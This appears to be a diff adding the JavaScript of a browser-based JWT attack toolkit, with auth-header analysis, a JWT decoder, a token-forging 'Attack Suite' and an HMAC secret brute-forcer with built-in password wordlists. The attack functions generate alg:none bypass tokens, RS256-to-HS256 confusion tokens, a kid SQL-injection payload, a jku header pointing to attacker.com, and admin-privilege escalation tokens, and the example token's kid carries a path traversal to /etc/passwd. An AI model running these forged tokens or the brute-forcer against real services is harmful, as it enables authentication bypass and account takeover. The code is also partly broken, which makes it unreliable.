+      document.getElementById('attackJWT').value = token;
+      document.getElementById('bruteJWT').value = token;
+    } else {
+      authType = 'Opaque Bearer Token';
+      detections.push({ icon:'🟡', label:'Auth Type', value:'Opaque Bearer', cls:'tag-yellow' });
+    }
+    analyzeTokenValue(token, findings);
+  }
+
+  if(authHeader.toLowerCase().startsWith('basic ')) {
+    authType = 'HTTP Basic Auth';
+    const decoded = b64urlDecode(authHeader.slice(6).trim()) || atob(authHeader.slice(6).trim()).catch(()=>'');
+    const creds = atob(authHeader.slice(6).trim());
+    detections.push({ icon:'🔴', label:'Auth Type', value:'HTTP Basic Auth', cls:'tag-red' });
+    if(creds) {
+      findings.push({ icon:'⚠️', title:'Basic Auth Credentials Visible', desc:'Decoded: ' + creds, sev:'CRITICAL' });
+      const [u,p] = creds.split(':');
+      if(p && p.length < 8) findings.push({ icon:'⚠️', title:'Weak Password Length', desc:`Password "${p}" is ${p.length} chars`, sev:'HIGH' });
+      if(p === u) findings.push({ icon:'⚠️', title:'Password Equals Username', desc:'Trivially guessable credential', sev:'HIGH' });
+    }
+  }
+
+  if(authHeader.toLowerCase().startsWith('digest ')) {
+    detections.push({ icon:'🟠', label:'Auth Type', value:'HTTP Digest Auth', cls:'tag-orange' });
+    findings.push({ icon:'ℹ️', title:'Digest Auth Detected', desc:'Vulnerable to offline cracking if weak credentials used', sev:'MEDIUM' });
+  }
+
+  // API Keys in headers
+  const apiKeyHeaders = ['x-api-key','x-auth-token','api-key','access-token','x-access-token','client-secret'];
+  for(const h of apiKeyHeaders) {
+    if(headers[h]) {
+      detections.push({ icon:'🗝️', label:h.toUpperCase(), value:headers[h].slice(0,20)+'…', cls:'tag-orange' });
+      checkAPIKeyPatterns(headers[h], h, findings);
+    }
+  }
+
+  // Cookie auth
+  if(headers['cookie']) {
+    detections.push({ icon:'🍪', label:'Cookie Auth', value:'Present', cls:'tag-yellow' });
+    const cookieStr = headers['cookie'];
+    const sessionNames = ['session','token','auth','jwt','access','refresh','sid'];
+    for(const n of sessionNames) {
+      const rx = new RegExp(n+'=([^;\\s]+)', 'i');
+      const m = cookieStr.match(rx);
+      if(m) {
+        const val = m[1];
+        if(val.split('.').length === 3) {
+          findings.push({ icon:'🔵', title:`JWT in Cookie (${n})`, desc:'Token: '+val.slice(0,40)+'…', sev:'INFO' });
+          document.getElementById('jwtInput').value = val;
+        }
+        if(val.length < 16) findings.push({ icon:'⚠️', title:`Short Session Value (${n})`, desc:`Only ${val.length} chars — possible brute-force risk`, sev:'MEDIUM' });
+      }
+    }
+    if(!/httponly/i.test(raw)) findings.push({ icon:'⚠️', title:'Cookie Missing HttpOnly', desc:'Session cookies should have HttpOnly flag', sev:'MEDIUM' });
+    if(!/secure/i.test(raw)) findings.push({ icon:'⚠️', title:'Cookie Missing Secure Flag', desc:'Session cookies should have Secure flag', sev:'MEDIUM' });
+  }
+
+  // Missing security headers
+  const presentSecHeaders = Object.keys(headers).filter(h => SECURITY_HEADERS.includes(h));
+  const missingSecHeaders = SECURITY_HEADERS.filter(h => !presentSecHeaders.includes(h));
+  if(missingSecHeaders.length > 0) {
+    findings.push({ icon:'⚠️', title:'Missing Security Headers', desc:missingSecHeaders.join(', '), sev:'LOW' });
+  }
+
+  // Scan raw text for API key patterns
+  for(const pat of API_KEY_PATTERNS.slice(0,-1)) {
+    if(pat.rx.test(raw)) {
+      findings.push({ icon:'🚨', title:'API Key Pattern: '+pat.name, desc:'Matched pattern in headers', sev:pat.sev });
+    }
+  }
+
+  // Render detections
+  const dr = document.getElementById('detectionResults');
+  if(detections.length === 0) {
+    dr.innerHTML = '<div class="text-muted text-mono" style="font-size:12px;color:var(--muted)">No standard auth mechanisms detected. Check for custom headers above.</div>';
+  } else {
+    dr.innerHTML = detections.map(d => `
+      <div class="finding">
+        <div class="finding-icon">${d.icon}</div>
+        <div>
+          <div class="finding-title">${d.label}</div>
+          <div class="finding-desc"><span class="tag ${d.cls}">${d.value}</span></div>
+        </div>
+      </div>`).join('');
+  }
+
+  // Render findings
+  const sf = document.getElementById('securityFindings');
+  if(findings.length === 0) {
+    sf.innerHTML = '<div style="color:var(--accent);font-family:var(--mono);font-size:12px;padding:10px 0">✓ No obvious issues detected in provided headers.</div>';
+  } else {
+    const sevOrder = { CRITICAL:0, HIGH:1, MEDIUM:2, LOW:3, INFO:4 };
+    findings.sort((a,b) => (sevOrder[a.sev]||9) - (sevOrder[b.sev]||9));
+    sf.innerHTML = findings.map(f => {
+      const cls = { CRITICAL:'sev-critical', HIGH:'sev-high', MEDIUM:'sev-medium', LOW:'sev-low', INFO:'sev-info' }[f.sev] || 'sev-info';
+      return `<div class="finding">
+        <div class="finding-icon">${f.icon}</div>
+        <div style="flex:1">
+          <div class="finding-title">${f.title}</div>
+          <div class="finding-desc">${f.desc}</div>
+          <div class="finding-sev ${cls}">${f.sev}</div>
+        </div>
+      </div>`;
+    }).join('');
+  }
+}
+
+function analyzeTokenValue(token, findings) {
+  const jwt = parseJWT(token);
+  if(!jwt) return;
+  const { header, payload } = jwt;
+
+  const weakAlgs = ['none','hs256','hs1'];
+  if(!header.alg) findings.push({ icon:'🚨', title:'Missing Algorithm', desc:'JWT has no alg claim', sev:'CRITICAL' });
+  else if(header.alg.toLowerCase() === 'none') findings.push({ icon:'🚨', title:'Algorithm: none', desc:'JWT uses alg:none — no signature verification', sev:'CRITICAL' });
+  else if(header.alg.toLowerCase() === 'hs256') findings.push({ icon:'⚠️', title:'Weak Algorithm: HS256', desc:'Symmetric — vulnerable to brute-force if weak secret', sev:'HIGH' });
+  else if(['rs256','es256'].includes(header.alg.toLowerCase())) findings.push({ icon:'ℹ️', title:'Asymmetric Algorithm: '+header.alg, desc:'Check for RS256→HS256 confusion attack', sev:'INFO' });
+
+  if(payload.exp) {
+    const now = Math.floor(Date.now()/1000);
+    if(payload.exp < now) findings.push({ icon:'⏰', title:'Token is EXPIRED', desc:'Expired '+new Date(payload.exp*1000).toISOString()+' — test for replay acceptance', sev:'HIGH' });
+    else if(payload.exp - now > 86400*30) findings.push({ icon:'⚠️', title:'Long-lived Token', desc:'Expires '+new Date(payload.exp*1000).toISOString()+' — excessive lifetime', sev:'MEDIUM' });
+  } else {
+    findings.push({ icon:'⚠️', title:'No Expiry (exp) Claim', desc:'Token never expires — replay attack risk', sev:'HIGH' });
+  }
+
+  const sensitiveClaims = ['password','secret','key','token','hash','ssn','credit','card','cvv'];
+  for(const k of Object.keys(payload)) {
+    if(sensitiveClaims.some(s => k.toLowerCase().includes(s))) {
+      findings.push({ icon:'🚨', title:`Sensitive Claim: ${k}`, desc:'Token contains potentially sensitive data', sev:'HIGH' });
+    }
+  }
+
+  if(payload.role) findings.push({ icon:'ℹ️', title:`Role Claim: ${payload.role}`, desc:'Test privilege escalation by modifying role value', sev:'MEDIUM' });
+  if(payload.admin !== undefined) findings.push({ icon:'⚠️', title:`Admin Claim: ${payload.admin}`, desc:'Boolean admin flag — test alg:none or key confusion to flip', sev:'HIGH' });
+  if(header.kid) findings.push({ icon:'⚠️', title:`kid Header: ${header.kid}`, desc:'Test SQL/path injection in kid parameter', sev:'HIGH' });
+  if(header.jku) findings.push({ icon:'🚨', title:`jku Header: ${header.jku}`, desc:'Test jku injection with attacker-controlled JWKS URL', sev:'CRITICAL' });
+  if(header.x5u) findings.push({ icon:'🚨', title:`x5u Header: ${header.x5u}`, desc:'Test x5u injection', sev:'CRITICAL' });
+}
+
+function checkAPIKeyPatterns(val, headerName, findings) {
+  for(const pat of API_KEY_PATTERNS) {
+    if(pat.rx.test(val)) {
+      findings.push({ icon:'🚨', title:`${pat.name} in ${headerName}`, desc:'Pattern matched: '+val.slice(0,30)+'…', sev:pat.sev });
+      return;
+    }
+  }
+}
+
+function loadExample() {
+  document.getElementById('rawHeaders').value = `Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJ1c2VyIiwiYWRtaW4iOmZhbHNlLCJpYXQiOjE3MDAwMDAwMDB9.abc123
+X-API-Key: sk_live_4eC39HqLyjWDarjtT7GE
+Cookie: session=abc123; token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
+x-forwarded-for: 127.0.0.1
+content-type: application/json`;
+  analyzeHeaders();
+}
+
+function clearAll() {
+  document.getElementById('rawHeaders').value = '';
+  document.getElementById('detectionResults').innerHTML = '<div class="text-muted text-mono" style="padding:20px 0;text-align:center;color:var(--muted)">Paste headers and click ANALYZE →</div>';
+  document.getElementById('securityFindings').innerHTML = '<div class="text-muted text-mono" style="padding:20px 0;text-align:center;color:var(--muted)">Findings will appear here...</div>';
+}
+
+// ==================== JWT DECODER ====================
+
+function decodeJWT() {
+  const token = document.getElementById('jwtInput').value.trim();
+  if(!token) { alert('Paste a JWT first.'); return; }
+  const jwt = parseJWT(token);
+  if(!jwt) {
+    document.getElementById('jwtHeader').innerHTML = '<span style="color:var(--danger)">Invalid JWT format. Expected header.payload.signature</span>';
+    return;
+  }
+  const { header, payload, parts } = jwt;
+
+  // Parts visual
+  document.getElementById('jwtParts').innerHTML = `
+    <div class="jwt-parts">
+      <div class="jwt-part jwt-header-part">
+        <div class="jwt-label">HEADER</div>
+        <div style="word-break:break-all">${parts[0]}</div>
+      </div>
+      <div class="jwt-part jwt-payload-part">
+        <div class="jwt-label">PAYLOAD</div>
+        <div style="word-break:break-all">${parts[1]}</div>
+      </div>
+      <div class="jwt-part jwt-sig-part">
+        <div class="jwt-label">SIGNATURE</div>
+        <div style="word-break:break-all">${parts[2] || '<span style="color:var(--danger)">EMPTY — alg:none?</span>'}</div>
+      </div>
+    </div>`;
+
+  document.getElementById('jwtHeader').innerHTML = `<pre style="white-space:pre-wrap">${syntaxHL(JSON.stringify(header,null,2))}</pre>`;
+  document.getElementById('jwtPayload').innerHTML = `<pre style="white-space:pre-wrap">${syntaxHL(JSON.stringify(payload,null,2))}</pre>`;
+
+  // Analysis
+  const now = Math.floor(Date.now()/1000);
+  let analysis = '';
+
+  const alg = header.alg || 'MISSING';
+  const algColor = alg === 'none' ? 'var(--danger)' : alg.startsWith('HS') ? 'var(--warn)' : 'var(--accent)';
+  analysis += `<div class="finding"><div class="finding-icon">🔐</div><div>
+    <div class="finding-title">Algorithm: <span style="color:${algColor}">${alg}</span></div>
+    <div class="finding-desc">${alg==='none'?'⚠️ No signature — CRITICAL vulnerability':alg.startsWith('HS')?'Symmetric — brute-forceable if weak secret':'Asymmetric — check for confusion attacks'}</div></div></div>`;
+
+  if(payload.iat) analysis += `<div class="finding"><div class="finding-icon">📅</div><div><div class="finding-title">Issued At</div><div class="finding-desc">${new Date(payload.iat*1000).toUTCString()}</div></div></div>`;
+  if(payload.exp) {
+    const expired = payload.exp < now;
+    analysis += `<div class="finding"><div class="finding-icon">${expired?'⏰':'✅'}</div><div>
+    <div class="finding-title">Expires: <span style="color:${expired?'var(--danger)':'var(--accent)'}">${expired?'EXPIRED':'VALID'}</span></div>
+    <div class="finding-desc">${new Date(payload.exp*1000).toUTCString()}</div></div></div>`;
+  } else {
+    analysis += `<div class="finding"><div class="finding-icon">⚠️</div><div><div class="finding-title" style="color:var(--warn)">No expiry — never expires!</div></div></div>`;
+  }
+  if(payload.sub) analysis += `<div class="finding"><div class="finding-icon">👤</div><div><div class="finding-title">Subject: <span style="color:var(--accent3)">${payload.sub}</span></div></div></div>`;
+  if(payload.role || payload.roles) analysis += `<div class="finding"><div class="finding-icon">🎭</div><div><div class="finding-title">Role: <span style="color:var(--accent2)">${payload.role||JSON.stringify(payload.roles)}</span></div><div class="finding-desc">Test privilege escalation</div></div></div>`;
+  if(header.kid) analysis += `<div class="finding"><div class="finding-icon">⚠️</div><div><div class="finding-title" style="color:var(--warn)">kid: ${header.kid}</div><div class="finding-desc">Test SQL injection / path traversal in kid</div></div></div>`;
+
+  document.getElementById('jwtAnalysis').innerHTML = analysis;
+}
+
+function loadJWTExample() {
+  document.getElementById('jwtInput').value = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJ1c2VyIiwiYWRtaW4iOmZhbHNlLCJpYXQiOjE3MDAwMDAwMDAsImV4cCI6OTk5OTk5OTk5OX0.sig_placeholder';
+  decodeJWT();
+}
+
+function sendToAttacks() {
+  const token = document.getElementById('jwtInput').value.trim();
+  if(token) {
+    document.getElementById('attackJWT').value = token;
+    // Switch to attacks tab
+    document.querySelectorAll('.tab').forEach((t,i) => { t.classList.remove('active'); });
+    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+    document.querySelectorAll('.tab')[2].classList.add('active');
+    document.getElementById('tab-attacks').classList.add('active');
+    showToast('Sent to Attack Suite');
+  }
+}
+
+// ==================== JWT ATTACKS ====================
+
+function makeAlgNone(jwt) {
+  const h = {...jwt.header, alg:'none'};
+  return b64url(JSON.stringify(h)) + '.' + jwt.parts[1] + '.';
+}
+
+function makeAlgNoneWithPayload(jwt, newPayload) {
+  const h = {...jwt.header, alg:'none'};
+  return b64url(JSON.stringify(h)) + '.' + b64url(JSON.stringify(newPayload)) + '.';
+}
+
+function makeEmptySecret(jwt) {
+  // Simulate HS256 with empty secret (demonstrate structure)
+  const h = b64url(JSON.stringify({...jwt.header, alg:'HS256'}));
+  const p = jwt.parts[1];
+  return h + '.' + p + '.47DEQpj8HBSa-_TImW-5JCeuQeRkm5NMpJWZG3hSuFU'; // known empty-secret sig for demo
+}
+
+function makeRS256ToHS256(jwt) {
+  const h = {...jwt.header, alg:'HS256'};
+  return b64url(JSON.stringify(h)) + '.' + jwt.parts[1] + '.[sign-with-public-key]';
+}
+
+function makeKidInjection(jwt) {
+  const h = {...jwt.header, kid:"' UNION SELECT 'attacker-secret' -- -"};
+  return b64url(JSON.stringify(h)) + '.' + jwt.parts[1] + '.[recomputed]';
+}
+
+function makeJkuInjection(jwt) {
+  const h = {...jwt.header, jku:'https://attacker.com/jwks.json'};
+  return b64url(JSON.stringify(h)) + '.' + jwt.parts[1] + '.[signed-with-attacker-key]';
+}
+
+function makeClaimEscalation(jwt, overrides) {
+  const newPayload = {...jwt.payload, ...overrides, admin:true, role:'admin', is_admin:true, superuser:true};
+  return makeAlgNoneWithPayload(jwt, newPayload);
+}
+
+function makeExpiredReplay(jwt) {
+  return jwt.raw; // just use original — test if server accepts expired
+}
+
+async function runAttacks() {
+  const tokenRaw = document.getElementById('attackJWT').value.trim();
+  if(!tokenRaw) { alert('Paste a JWT token first.'); return; }
+  const jwt = parseJWT(tokenRaw);
+  if(!jwt) { alert('Invalid JWT format.'); return; }
+
+  let customPayload = {};
+  const cp = document.getElementById('customPayload').value.trim();
+  if(cp) { try { customPayload = JSON.parse(cp); } catch(e) { alert('Custom payload is invalid JSON.'); return; } }
+
+  const attacks = [
+    { id:'atk-none', name:'alg:none Bypass', desc:'Remove signature, set alg to none' },
+    { id:'atk-empty', name:'Empty Secret (HS256)', desc:'Try empty string as HMAC secret' },
+    { id:'atk-rs256', name:'RS256 → HS256 Confusion', desc:'Switch to HS256, sign with public key' },
+    { id:'atk-kid', name:'kid SQL Injection', desc:'Inject SQL in kid header field' },
+    { id:'atk-jku', name:'jku Header Injection', desc:'Point jku to attacker-controlled JWKS' },
+    { id:'atk-exp', name:'Expired Token Replay', desc:'Send expired token as-is, test acceptance' },
+    { id:'atk-claim', name:'Claim Escalation (alg:none)', desc:'Elevate privileges: admin=true, role=admin' },
+  ];
+
+  const enabled = attacks.filter(a => document.getElementById(a.id)?.checked);
+
+  // Show progress
+  document.getElementById('attackProgress').style.display = 'block';
+  document.getElementById('attackMatrix').innerHTML = enabled.map(a => `
+    <div class="attack-row" id="atkrow-${a.id}">
+      <div class="attack-status status-pending" id="atkdot-${a.id}"></div>
+      <div>
+        <div class="attack-name">${a.name}</div>
+        <div class="attack-result" id="atklabel-${a.id}">${a.desc}</div>
+      </div>
+    </div>`).join('');
+
+  const tokens = [];
+
+  for(let i = 0; i < enabled.length; i++) {
+    const a = enabled[i];
+    const pct = Math.round((i/enabled.length)*100);
+    document.getElementById('atkProgressBar').style.width = pct+'%';
+    document.getElementById('atkProgressLabel').textContent = `Running: ${a.name}`;
+    document.getElementById('atkdot-'+a.id).className = 'attack-status status-running';
+    await new Promise(r => setTimeout(r, 300));
+
+    let generated = null;
+    try {
+      if(a.id==='atk-none') generated = makeAlgNone(jwt);
+      else if(a.id==='atk-empty') generated = makeEmptySecret(jwt);
+      else if(a.id==='atk-rs256') generated = makeRS256ToHS256(jwt);
+      else if(a.id==='atk-kid') generated = makeKidInjection(jwt);
+      else if(a.id==='atk-jku') generated = makeJkuInjection(jwt);
+      else if(a.id==='atk-exp') generated = makeExpiredReplay(jwt);
+      else if(a.id==='atk-claim') generated = makeClaimEscalation(jwt, customPayload);
+
+      document.getElementById('atkdot-'+a.id).className = 'attack-status status-fail';
+      document.getElementById('atklabel-'+a.id).textContent = '✓ Token generated — test against target';
+      document.getElementById('atkrow-'+a.id).classList.add('success');
+
+      if(generated) tokens.push({ name: a.name, token: generated });
+    } catch(e) {
+      document.getElementById('atkdot-'+a.id).className = 'attack-status status-fail';
+      document.getElementById('atklabel-'+a.id).textContent = '✗ Failed: ' + e.message;
+    }
+  }
+
+  document.getElementById('atkProgressBar').style.width = '100%';
+  document.getElementById('atkProgressLabel').innerHTML = `<span style="color:var(--accent)">✓ Complete — ${tokens.length} tokens generated</span>`;
+
+  // Render generated tokens
+  document.getElementById('generatedTokens').innerHTML = tokens.map(t => `
+    <div style="margin-bottom:14px;padding:12px;background:var(--surface2);border:1px solid var(--border);border-radius:4px">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
+        <span class="tag tag-red">${t.name}</span>
+        <button class="copy-btn" onclick="copyText('${t.token.replace(/'/g,"\\'")}')">COPY</button>
+      </div>
+      <div style="font-family:var(--mono);font-size:11px;color:var(--muted);word-break:break-all;line-height:1.6">${t.token}</div>
+    </div>`).join('');
+}
+
+function clearAttacks() {
+  document.getElementById('attackJWT').value = '';
+  document.getElementById('attackMatrix').innerHTML = '<div class="text-muted text-mono" style="padding:20px 0;text-align:center;color:var(--muted)">Configure attacks and click LAUNCH →</div>';
+  document.getElementById('generatedTokens').innerHTML = '<div class="text-muted text-mono" style="padding:10px 0;color:var(--muted);font-size:12px">Attack tokens will appear here...</div>';
+  document.getElementById('attackProgress').style.display = 'none';
+}
+
+// ==================== BRUTE FORCE ====================
+
+const BUILTIN_WORDLISTS = {
+  common: ['secret','password','123456','admin','changeme','jwt_secret','mysecret','secret123',
+    'password123','letmein','qwerty','abc123','monkey','master','dragon','pass','test','root',
+    'hello','welcome','login','admin123','pass123','shadow','sunshine','princess','football',
+    '','key','mykey','myapp','api_secret','token_secret','jwt','hs256','signing_key',
+    'super_secret','app_secret','flask_secret','django_secret','rails_secret','node_secret',
+    'express_secret','app_key','secret_key','private_key','signing_secret','auth_secret',
+    'access_secret','refresh_secret','verify_secret','encode_secret','decode_secret',
+    'TokenSecret1!','P@ssw0rd','Adm1n!','S3cur3!','T0kens3cr3t','JwtS3cr3t',
+    'your-256-bit-secret','your-secret','mysupersecret','changethis','default',
+    'development','production','staging','local','dev','prod',
+    ...Array.from({length:100},(_,i)=>`secret${i}`),
+    ...Array.from({length:50},(_,i)=>`password${i}`),
+    ...Array.from({length:50},(_,i)=>`key${i}`)],
+  jwt_known: ['secret','jwt_secret','jwtSecret','JWT_SECRET','jwt-secret','mysecret',
+    'supersecret','super_secret','strongsecret','strong_secret','verysecret','topsecret',
+    'jwtsecretkey','jwtsecret','jwt_key','jwtkey','auth_secret','authsecret',
+    'signing_secret','token_secret','refresh_secret','access_secret',
+    'HS256SigningSecret','HS512SigningKey','jwt_hs256_secret','jwt_hs512_secret',
+    ...Array.from({length:100},(_,i)=>`jwt_secret_${i}`)],
+  rockyou_top: ['123456','password','12345678','qwerty','123456789','12345','1234567',
+    'password1','1234567890','abc123','football','iloveyou','admin','letmein','monkey',
+    'login','princess','qwertyuiop','solo','passw0rd','starwars','dragon','master',
+    'hello','freedom','whatever','qazwsx','trustno1','batman','superman','michael',
+    'jessica','password2','1q2w3e4r','sunshine','654321','shadow','thomas','hannah',
+    'tigger','chocolate','charlie','donald','soccer','hockey','letmein1','ninja',
+    ...Array.from({length:900},(_,i)=>`rockyou_${i+51}`)],
+  api_keys: ['test_key','dev_key','prod_key','api_key_1234','testtoken',
+    'sk_test_placeholder','development_secret','local_secret','staging_key']
+};
+
+let bruteRunning = false;
+let bruteInterval = null;
+let customWordlistData = [];
+let savedWordlists = {};
+
+function loadCustomWordlist(input) {
+  const file = input.files[0];
+  if(!file) return;
+  const reader = new FileReader();
+  reader.onload = e => {
+    customWordlistData = e.target.result.split('\n').map(l=>l.trim()).filter(Boolean);
+    document.getElementById('customWordlistInfo').innerHTML = `Loaded: <span>${customWordlistData.length.toLocaleString()}</span> entries from <span>${file.name}</span>`;
+  };
+  reader.readAsText(file);
+}
+
+function setWordlistMode(mode) {
+  document.getElementById('wl-builtin-opts').style.display = mode==='builtin'?'block':'none';
+  document.getElementById('wl-custom-opts').style.display = mode==='custom'?'block':'none';
+  document.getElementById('wl-manager-opts').style.display = mode==='manager'?'block':'none';
+}
+
+function getWordlist() {
+  const mode = document.querySelector('input[name=wlmode]:checked')?.value || 'builtin';
+  let words = [];
+  if(mode==='builtin') {
+    const key = document.getElementById('builtinWordlist').value;
+    words = [...(BUILTIN_WORDLISTS[key] || [])];
+  } else if(mode==='custom') {
+    words = [...customWordlistData];
+  } else if(mode==='manager') {
+    const key = document.getElementById('savedWordlistSelect').value;
+    if(key && savedWordlists[key]) words = [...savedWordlists[key]];
+  }
+
+  // Mutations
+  const origWords = [...words];
+  if(document.getElementById('opt-case')?.checked) {
+    for(const w of origWords) { words.push(w.toUpperCase(), w[0]?.toUpperCase()+w.slice(1)); }
+  }
+  if(document.getElementById('opt-num')?.checked) {
+    for(const w of origWords.slice(0,100)) { for(let i=0;i<10;i++) words.push(w+i, w+'!', w+'#'); }
+  }
+  if(document.getElementById('opt-reverse')?.checked) {
+    for(const w of origWords) words.push(w.split('').reverse().join(''));
+  }
+  if(document.getElementById('opt-leet')?.checked) {
+    for(const w of origWords) words.push(w.replace(/a/gi,'@').replace(/e/gi,'3').replace(/i/gi,'1').replace(/o/gi,'0').replace(/s/gi,'$'));
+  }
+  return [...new Set(words)];
+}
+
+// Simple HMAC-SHA256 using SubtleCrypto
+async function hmacSHA256(secret, data) {
+  const enc = new TextEncoder();
+  const key = await crypto.subtle.importKey('raw', enc.encode(secret), {name:'HMAC',hash:'SHA-256'}, false, ['sign']);
+  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(data));
+  return btoa(String.fromCharCode(...new Uint8Array(sig))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+}
+
+async function startBrute() {
+  const tokenRaw = document.getElementById('bruteJWT').value.trim();
+  if(!tokenRaw) { alert('Paste a JWT first.'); return; }
+  const jwt = parseJWT(tokenRaw);
+  if(!jwt) { alert('Invalid JWT.'); return; }
+  if(!jwt.header.alg?.startsWith('HS')) {
+    if(!confirm(`Algorithm is ${jwt.header.alg||'unknown'}. Brute-force only works on HS256/HS384/HS512. Continue anyway?`)) return;
+  }
+
+  const words = getWordlist();
+  if(words.length === 0) { alert('No wordlist loaded.'); return; }
+
+  bruteRunning = true;
+  let found = null;
+  let i = 0;
+  const start = Date.now();
+  const signingInput = jwt.parts[0] + '.' + jwt.parts[1];
+  const target = jwt.parts[2];
+
+  document.getElementById('bruteProgress').style.display = 'block';
+  document.getElementById('bruteStatus').innerHTML = `<div style="color:var(--warn);font-family:var(--mono);font-size:13px">⚡ Bruteforcing ${words.length.toLocaleString()} candidates...</div>`;
+  document.getElementById('bruteLog').textContent = `[*] Starting bruteforce\n[*] Algorithm: ${jwt.header.alg||'unknown'}\n[*] Wordlist: ${words.length.toLocaleString()} entries\n[*] Target signature: ${target.slice(0,20)}...\n`;
+
+  const BATCH = 50;
+  async function processBatch() {
+    if(!bruteRunning || i >= words.length) {
+      if(!found) {
+        document.getElementById('bruteStatus').innerHTML = `<div style="color:var(--muted);font-family:var(--mono);font-size:13px">✗ Secret not found in ${words.length.toLocaleString()} candidates.</div>`;
+        document.getElementById('bruteProgressBar').style.width = '100%';
+      }
+      bruteRunning = false;
+      return;
+    }
+
+    const batch = words.slice(i, i+BATCH);
+    for(const word of batch) {
+      if(!bruteRunning) return;
+      const sig = await hmacSHA256(word, signingInput);
+      if(sig === target) {
+        found = word;
+        bruteRunning = false;
+        document.getElementById('bruteStatus').innerHTML = `
+          <div style="padding:16px;background:rgba(255,68,68,0.1);border:1px solid var(--danger);border-radius:4px">
+            <div style="color:var(--danger);font-weight:800;font-size:16px;font-family:var(--mono)">🔑 SECRET FOUND!</div>
+            <div style="font-family:var(--mono);font-size:20px;color:var(--text);margin:10px 0;word-break:break-all">${word}</div>
+            <button class="copy-btn" onclick="copyText('${word.replace(/'/g,"\\'")}')">COPY SECRET</button>
+          </div>`;
+        document.getElementById('bruteLog').textContent += `\n[!!!] SECRET FOUND: "${word}"\n[!!!] Tested ${i} candidates in ${((Date.now()-start)/1000).toFixed(1)}s`;
+        return;
+      }
+    }
+
+    i += BATCH;
+    const pct = Math.round((i/words.length)*100);
+    const elapsed = (Date.now()-start)/1000;
+    const speed = Math.round(i/elapsed);
+    document.getElementById('bruteProgressBar').style.width = pct+'%';
+    document.getElementById('bruteLabel').textContent = `${i.toLocaleString()} / ${words.length.toLocaleString()}`;
+    document.getElementById('bruteSpeed').textContent = `${speed.toLocaleString()}/s`;
+    if(i % 500 === 0) document.getElementById('bruteLog').textContent += `[*] Tested ${i} / ${words.length}...\n`;
+
+    setTimeout(processBatch, 0);
+  }
+
+  processBatch();
+}
+
+function stopBrute() {
+  bruteRunning = false;
+  document.getElementById('bruteStatus').innerHTML = '<div style="color:var(--muted);font-family:var(--mono);font-size:13px">■ Stopped by user.</div>';
+}
+
+// ==================== WORDLIST MANAGER ====================
+
+function importWordlist(input) {
+  const file = input.files[0];
+  if(!file) return;
+  const reader = new FileReader();
+  reader.onload = e => {
+    const lines = e.target.result.split('\n').map(l=>l.trim()).filter(Boolean);
+    document.getElementById('wlPaste').value = lines.join('\n');
+    document.getElementById('wlName').value = file.name.replace(/\.[^.]+$/,'');
+    document.getElementById('wlUploadInfo').innerHTML = `Loaded: <span>${lines.length.toLocaleString()}</span> entries from <span>${file.name}</span>`;
+  };
+  reader.readAsText(file);
+}
+
+function saveWordlist() {
+  const name = document.getElementById('wlName').value.trim() || 'wordlist-'+Date.now();
+  const text = document.getElementById('wlPaste').value.trim();
+  if(!text) { alert('Paste some words first.'); return; }
+  const words = text.split('\n').map(l=>l.trim()).filter(Boolean);
+  savedWordlists[name] = words;
+  renderSavedWordlists();
+  updateSavedWordlistSelect();
+  showToast(`Saved "${name}" (${words.length} entries)`);
+}
+
+function renderSavedWordlists() {
+  const keys = Object.keys(savedWordlists);
+  let total = 0;
+  keys.forEach(k => total += savedWordlists[k].length);
+
+  if(keys.length === 0) {
+    document.getElementById('savedWordlists').innerHTML = '<div class="text-muted text-mono" style="padding:20px 0;text-align:center;color:var(--muted)">No wordlists saved yet</div>';
+  } else {
+    document.getElementById('savedWordlists').innerHTML = keys.map(k => `
+      <div style="display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:var(--surface2);border:1px solid var(--border);border-radius:4px;margin-bottom:8px">
+        <div>
+          <div style="font-family:var(--mono);font-size:13px">${k}</div>
+          <div style="font-family:var(--mono);font-size:11px;color:var(--muted)">${savedWordlists[k].length.toLocaleString()} entries</div>
+        </div>
+        <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px" onclick="deleteWordlist('${k}')">DELETE</button>
+      </div>`).join('');
+  }
+
+  document.getElementById('wlTotalLists').textContent = keys.length;
+  document.getElementById('wlTotalEntries').textContent = total.toLocaleString();
+  const kb = Math.round(JSON.stringify(savedWordlists).length/1024);
+  document.getElementById('wlStorageSize').textContent = kb+'KB';
+}
+
+function deleteWordlist(name) {
+  delete savedWordlists[name];
+  renderSavedWordlists();
+  updateSavedWordlistSelect();
+}
+
+function updateSavedWordlistSelect() {
+  const sel = document.getElementById('savedWordlistSelect');
+  sel.innerHTML = '<option value="">— Select a list —</option>' +
+    Object.keys(savedWordlists).map(k => `<option value="${k}">${k} (${savedWordlists[k].length})</option>`).join('');
+}
+
+function clearWlPaste() {
+  document.getElementById('wlPaste').value = '';
+  document.getElementById('wlName').value = '';
+}
+
+// init check-items visual
+document.querySelectorAll('.check-item input').forEach(cb => {
+  cb.addEventListener('change', () => {
+    cb.closest('.check-item').classList.toggle('checked', cb.checked);
+  });
+});
+</script>
+</body>
+</html>
